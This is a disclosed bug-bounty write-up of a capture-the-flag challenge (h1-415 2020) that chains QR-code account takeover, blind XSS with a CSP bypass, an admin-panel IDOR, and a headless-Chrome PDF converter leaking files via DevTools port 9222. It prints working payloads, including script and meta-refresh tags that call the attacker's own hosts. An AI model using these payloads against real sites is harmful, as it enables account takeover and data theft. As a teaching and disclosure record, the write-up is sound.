---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - env/web
  - vuln/sql-injection
  - vuln/xss
  - vuln/csrf
  - vuln/idor
  - vuln/privilege-escalation
  - vuln/open-redirect
  - impact/account-takeover
  - trigger/admin-required
  - trigger/dns-rebinding
  - fix/csp
  - fix/authorization-checks
substate: "resolved"
weakness: null
enriched: true
body: true
date: 2020-02-03
submitted: 2020-01-18T00:06:25.417Z
bounty_usd: null
votes: 18
cve: []
program: "[[programs/h1-ctf|h1-ctf]]"
reporter: "nytr0gen"
source: "https://hackerone.com/reports/777241"
title: "[h1-415 2020] Multiple chained vulnerabilities lead to leaking secret document"
---
# [h1-415 2020] Multiple chained vulnerabilities lead to leaking secret document

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 18 | **Program:** h1-ctf | **Disclosed:** 2020-02-03

- Report: [https://hackerone.com/reports/777241](https://hackerone.com/reports/777241)
- CWE: N/A
- Submitted: 2020-01-18T00:06:25.417Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi!

# Summary
Multiple chained vulnerabilities lead to leaking secret documents.

Improper sanitization in registration allows an attacker to create a QR recover code for any email address. This leads to an account takeover.

Using that technique on jobert's account, attacker can access the support chat functionality. This endpoint, besides some meaningful conversation, is vulnerable to Blind XSS.

Blind XSS leaks an admin page that can change the name of any user, knowing the `user_id`. Abusing this vulnerability an attacker can change his name to a malicious payload and run it through the PDF converter. An attacker can then leak the secret documents processed by the converter.

The secret document contains the following highly classified flag: `h1ctf{y3s_1m_c0sm1c_n0w}`

# Story

My journey consists of two almost sleepless nights, skipping two days of gym, drinking hot chocolate late at night and praying for cosmic bugs.

## 0. Recon

I begin by proceeding to recon the application from all angles and noting everything in a document. I learned that from [ippsec's videos](https://ippsec.rocks/), small shout out.

Some interesting bits I observed are:

After you register, you get a beautiful QR Code, specially made for you, that you might want to save. It contains the email address (hex encoded) and a big token, which may be a hash of something (email, id, username, name, [random stuff](https://dilbert.com/strip/2001-10-25)), may not be a hash of something.

There is a PDF convertor. Also it converts the image to a thumbnail. I'll go an limb here and say that the PDF is what we should focus on, based on: gut feeling, the fact that nahamsec has a pinned post about PDF generators, and the fact that he did say that, on discord.

{F688269}

You can find jobert's email on the first page if you're reading the source code. It is `jobert@mydocz.cosmic`. Does that mean we will find some cosmic bugs today? I hope so.

{F688270}

While logging out I noticed an `return_url` parameter for login. That's pretty cool, in my experience, it allows for open redirect. This one kinda does, but not really. It's a POST based open redirect and you need the CSRF Token. I tried XSS, SSTI and everything else in between but no luck.

I tested most inputs with the following polyglot I found on Twitter a while ago `App"/><s>'${7*6}[!--+*)(&`. I like it because most of the WAFs don't get triggered by it. Changing my name with this, I saw that `<>{}` are being removed. Basically `App"/><s>'${7*6}[!--+*)(&` got turned into `App"/s'$7*6[!--+*)(&`. Interesting fact.

On the user settings page, there was an `user_id` parameter, hidden. I tried a bunch of things with it, but I couldn't change the profile of other users. Hint: use Burp to unhide these for you, makes things easier.

By getting the password wrong for my account, I discovered we have a Forgot Password option which points to `/recover`. This one can be found by dir busting too.

Every page has a Content-Security-Policy which basically means: we are allowed to use any image; scripts only on this host or prefixed with `https://raw.githack.com/mattboldt/typed.js/master/lib/`; everything else must be on this host.

```
Content-Security-Policy: default-src 'self'; object-src 'none'; script-src 'self' https://raw.githack.com/mattboldt/typed.js/master/lib/; img-src data: *
```

Well, I read about (a bypass for that kind of CSP)[https://blog.0daylabs.com/2016/09/09/bypassing-csp/], a while ago, and I take this as a hint that we will have to bypass this later on.

## 1. Account Takeover via QR Code

{F688289}

I attempted a lot of ways to use the recovery QR code for another account: swapping tokens between two codes, removing the code, using one before the restart, trying SQL injection in the email..

To decode I created the a [CyberChef recipe](https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Regex','string':'%5C%5Cx00'%7D,'',true,false,true,false)Find_/_Replace(%7B'option':'Simple%20string','string':'data:image/png;base64,'%7D,'',true,false,true,false)From_Base64('A-Za-z0-9%2B/%3D',true)Parse_QR_Code(false)). This way I could copy them from the browser and decode it fast.

{F688290}

I got lucky a bit. Remember that the app strips `<>{}` on your name? It does that to the username too if we register with "a malicious payload". But apparently not on the email. `nytr0gen@wearehackerone.com{}` is completely valid. Nice!

Side note: To do that either: manually change the input type from `email` to `text`, or use Burp's Match and Replace. Because the browser (and only the browser) validates for allowed email characters.

I tried the QR code from that account and it didn't work. And with a completely different error. It usually was `Something went wrong, please try again.` or `Invalid Code`. That must be interesting, I decoded the QR code and apparently the email inside was `nytr0gen@wearehackerone.com`. OMG! (well the OMG moment hit me after 5 minutes or so).

{F688284}

What if I can register with the email `jobert@mydocz.cosmic{` and use the recovery code for `jobert@mydocz.cosmic` ??? I did that in a hurry and it worked. I was ecstatic. (not that ecstatic the next 24 hours doing this for every restart)

**To mitigate this vulnerability** I would use the sanitize part on the email as early in the validation as possible. Making sure that all functionalities will get the same email address.

## 2. Blind XSS in support chat

Jobert's account is kinda limited (no offense if you're reading this, you rock). I can't upload new documents because "his license expired" and he has no documents. We were lied to from the beginning.

{F688282}

But Jobert's account brings out new functionality. The support chat. And by analyzing the JS code for it, it seems to be vulnerable to XSS, at least on the client side.

```js

$("#chat-form").submit(async function(e) {
    e.preventDefault();
    var t = $("#chat-textarea").val();
    if ("finish" !== t.toLowerCase()
        && "quit" !== t.toLowerCase()
    ) {
        $("#chat-textarea").val("");
        $("#chat-button").attr("disabled", !0);
        $("#chat-div").append(decodeURIComponent('<h3><span class="badge badge-primary">' + t + "</span></h3>"));
        window.scrollTo(0, document.body.scrollHeight);
        if (t.length > 0) {
            var a = await fetch("/support/chat?message=" + t);
            showTypedMessages([(await a.json()).response])
        }
        $("#chat-button").attr("disabled", !1);
        $("#chat-textarea").focus();
    } else showReviewModal()
});
```

Observe the `$("#chat-div").append(decodeURIComponent('<h3><span class="badge badge-primary">' + t + "</span></h3>"));` part and that `t` is user input.

And also there's a hint that this might be a Blind XSS. If we choose to give a feedback of 1 star, we will see the following message `We're sorry about that. Our team will review this conversation shortly.`.

To validate that the other part of the server is vulnerable I chose a payload that doesn't care about the CSP, a `meta refresh tag`: `<meta http-equiv="refresh" content="0;url=https://h4ks.net/go/test2" />` which points to my webserver. And it got a pingback! happy days.

{F688271}

Side note: you won't be able to send this request from the browser because it will redirect you instantly and you won't be able to finish the chat and send it for review. You will have to send the requests from Burp.

Now what do we do about the CSP. [The article I mentioned above](https://blog.0daylabs.com/2016/09/09/bypassing-csp/) comes to the rescue. So we have to bypass `https://raw.githack.com/mattboldt/typed.js/master/lib/`. What does `raw.githack.com` do? Quick read: it gets content from Github and puts the right `Content-Type`. What does this mean? This means I can use a JS file inside one of my Github repos. I choose an older repo from my github to be "stealthy" and play around. You can check failed attempts in [the following commits](https://github.com/nytr0gen/regex-to-dfa/commits?author=nytr0gen&since=2020-01-01&until=2020-01-18).

It worked. Then a long battle started with writing payloads, figuring out what I need from the page, etc.

**To mitigate this vulnerability** I would properly HTML escape the user input on render for admin, user and user Javascript.

## 3. IDOR in Admin Panel to modify users

{F688292}

The page is actually an admin panel that allows to change the name of the user (similar to /settings). It is located at [/support/review/ce643894bb1ce7a4712691db4d18d37550275b861ce90e2c43df0adb09395fd1](https://h1-415.h1ctf.com/support/review/ce643894bb1ce7a4712691db4d18d37550275b861ce90e2c43df0adb09395fd1). I had to exfil the location after every restart.

There is a `user_id` parameter that works with other users. This explains why we have an `user_id` in `/settings`.

I wasn't able to change the name of user 2 (Jobert) and user 1 (what keeps me up at night is who is user 1...).

Remember the sanitization for `<>{}` in settings? Here, the `name` is not sanitized. Anything goes.

The page doesn't check for authorization. That means I was able to access it and play with it from a regular user.

**To mitigate this vulnerability** I would do the following things:

- properly check for authorization only from an admin account
- sanitized the name when modifying
- use HTML escape for the user input from the support chat
- check if the `user_id` is the same as the one for the support chat review

## 4. PDF Generator leaking secrets

Using the admin page, I was able to change the name on my profile to my real name, which is `"'><script src=//nytr0.xss.ht></script>`. Good times!

Before I continue I must confess I had an interesting conversation with the support person. They are very articulate I must say. But when I asked about hints, they wouldn't bulge... I insisted and asked about the flag, and they provided something interesting.

{F688277}

Well, remember the PDF generator from before? An attacker can now use malicious payloads against. Hehe. That means me, I'm the attacker, I'm after your secret documents.

{F688285}

I had a lot of failed tries on this one:

- I can redirect to my page and have a PDF done of that
- tried a bunch of SSTI payloads `{{4*4}} [[5*5]] {7*7} ${9*9}`
- tested for `/settings` to see if I can find the infamous user 1
- hopeless for some hours, tried a bunch of different things, even gone back to the other vulnerabilities to try to escalate them somehow
- maybe tried the same things more than once
- I tried to load `http://mydocz.cosmic/` for at least 10 times
- all the while re-registering every hour. That part was loads of fun.
- tried to access AWS metadata url. It should have worked with an iframe but it failed to generate a PDF file. Anyway I tried a hail-merry and used the DNS Rebinding tool from Daeken.

Then I read some more about Chrome Headless and how it should work (30 new RAM-eating tabs). One article suggested that it comes with [DevTools](https://developers.google.com/web/updates/2017/04/headless-chrome#frontend) open at port `9222`. That's a stretch but let's try it.

And it freaking WORKED!

{F688296}

What now? Understand the websocket protocol I guess.. I opened the Chrome Headless DevTools locally (`google-chrome-stable --headless --disable-gpu --remote-debugging-port=9222 https://www.chromestatus.com`) and saw a `/json/list` endpoint. Let's check `http://localhost:9222/json/list` on our PDF converter.

{F688272}

Can you see it? To my shame, I didn't see it the first time and I generated another pdf to see if the ids differ, because I was 100% ready to work out the websocket protocol for devtools. There it was, the secret document !!! I screamed with joy enough that I woke up my girlfriend. That part ended well too.

{F688273}

**To mitigate this vulnerability** I would do the following:
- disable javascript in the PDF converter
- properly HTML escape the user input - meaning the name of the user

It was a great challenge. I had a lot of fun solving it and putting the pieces together. I want to thank everyone in this great community for being so friendly to beginners.

## Impact

It's pretty bad.

#bountyplz
#bountyplz
#bountyplz

## Timeline

- **Report Filed**
- **2020-01-18** @nytr0gen: ## Forgotten Mentions:

- The Blind XSS from chat described can also be used as **a XSS bug**. Attacker needs to load an image with the payload, that payloads gets stored in the victims session, and then redirect the victim to the `/support` page.

- **The Curse of The 502** was lifted using the following one liner:

```bash
st=502; while [[ "$st" -eq "502" ]]; do st=$(curl -s -o /dev/null -w "%{http_code}" "https://h1-415.h1ctf.com"); echo $st; sleep 2; done; notify-send "it's up again"
```

- **Document sharing** is allowed. This means that after converting a document, you can get the link and share it with other people and they can see without any authentification. This was an useful note for when I encountered the secret document

- I think the platform is written in **Python Flask**. Usually the `session` token is an indicator for the backend used. In this case it looks like this `.eJw9y0EKwjAQQNG7zLrINDWdmpX3EAnT6QSrppEkLqp4dwuCyw_vv8FLycHXdNMFHJAO1pIh1B5bPmCg1k6jxdDLvmNk5oG0UwMNyIUruNO5AY0837f5mkbN9RjXKclrJ6nEWTb4LJp9XR8Kzvxq4ah_D58vtiEqkg.XiJUxw.-_kyHV15ebZdFFdqYLshWNPMxu8`, which might be confused with a JWT, but it's not. It can be decoded with [this CyberChef recipe](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9-_',true)Zlib_Inflate(0,0,'Adaptive',false,false)&input=LmVKdzl5MEVLd2pBUVFORzd6THJJTkRXZG1wWDNFQW5UNlFTcnBwRWtMcXA0ZHd1Q3l3X3Z2OEZMeWNIWGROTUZISkFPMXBJaDFCNWJQbUNnMWs2anhkREx2bU5rNW9HMFV3TU55SVVydU5PNUFZMDgzN2Y1bWtiTjlSalhLY2xySjZuRVdUYjRMSnA5WFI4S3p2eHE0YWhfRDU4dnRpRXFrZy5YaUpVeHcuLV9reUhWMTVlYlpkRkZkcVlMc2hXTlBNeHU4).

- I believe it's a good practice to make the used **Github repository private until the contest is over**. Because anyone can just scroll through the [Thanks List of this program](https://hackerone.com/h1-415-ctf/thanks), go to my Github profile and grab themselves some hints.

- I made a quick **PoC Video** with the process of exploiting this chain of bugs: 

{F688314}
- **Report Triaged**
- **2020-01-23** @nahamsec: Hey there,

Just a quick reminder to not post any writeups online until we announce the winners and request disclosure on your submission. 

Thanks!
- **2020-01-31** @nahamsec: Hello Hackers! 

I just wanted to update everyone that we are in the process of selecting our winners. We should have an announcement out early next week! Thank you for your patience and happy hacking!
- **2020-01-31** @nytr0gen: Thanks for the update! Looking forward to disclosing this ^^
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **2020-02-15** @nahamsec: Hi there you were one of the first 5 to solve this CTF! Can you please email community@hackerone.com with your address and shirt/hoodie size and we'll send you some swag! Please make sure to include "H1-415 CTF Winner" in the title. 

Cheers!
- **2020-02-15** @nytr0gen: Sure thing! Thanks
- **Report Title Updated**
